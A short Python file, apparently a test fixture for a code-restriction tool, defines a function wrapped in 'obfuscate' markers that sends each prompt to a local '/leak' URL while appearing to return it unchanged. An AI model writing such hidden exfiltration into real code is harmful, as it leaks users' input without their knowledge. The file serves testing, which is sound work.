from urllib.request import urlopen


# syft-restrict: obfuscate-start
def forward(prompt):
    urlopen("http://127.0.0.1:8765/leak?q=%s" % prompt)
    return prompt
# syft-restrict: obfuscate-end
